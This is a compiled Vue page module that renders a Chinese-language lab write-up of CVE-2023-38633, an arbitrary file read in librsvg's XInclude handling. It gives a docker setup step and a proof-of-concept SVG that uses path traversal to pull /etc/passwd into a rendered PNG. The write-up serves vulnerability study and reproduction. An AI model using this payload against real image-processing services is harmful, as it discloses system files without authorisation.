import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c,a,b as n,d as t,e as l}from"./app-58e4a7d6.js";const u={},i=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),r=a("p",null,"librsvg是一个用于处理SVG图片的开源依赖库。",-1),k=a("p",null,"librsvg支持XML中的XInclude规范，可以用于加载外部内容。在librsvg 2.56.3版本以前，由于处理路径存在逻辑错误，导致攻击者可以传入一个恶意构造的SVG图片，进而读取到任意文件。",-1),d=a("p",null,"参考链接：",-1),g={href:"https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://gitlab.gnome.org/GNOME/librsvg/-/issues/996",target:"_blank",rel:"noopener noreferrer"},v=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个PHP服务器，其中使用librsvg 2.50.7将用户上传的SVG图片转换成PNG图片并返回：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看到上传页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231008151112752.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>将路径嵌入到<code>&lt;xi:include&gt;</code>标签中，如下POC：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>300<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>300<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XInclude<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rect</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>300<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>300<span class="token punctuation">&quot;</span></span> <span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>fill:rgb(255,255,255);<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>10<span class="token punctuation">&quot;</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.?../../../../../../../../../../etc/passwd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>fallback</span><span class="token punctuation">&gt;</span></span>file not found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xi:</span>fallback</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xi:</span>include</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传这个SVG图片：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231008151741792.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问返回的图片名<code>6522569dc29e3.png</code>，可查看到<code>/etc/passwd</code>已被成功读取并渲染进PNG图片：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231008153158276.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function h(b,q){const s=p("ExternalLinkIcon");return o(),c("div",null,[i,r,k,d,a("ul",null,[a("li",null,[a("a",g,[n("https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/"),t(s)])]),a("li",null,[a("a",m,[n("https://gitlab.gnome.org/GNOME/librsvg/-/issues/996"),t(s)])])]),v])}const x=e(u,[["render",h],["__file","librsvg XInclude 文件包含漏洞 CVE-2023-38633.html.vue"]]);export{x as default};
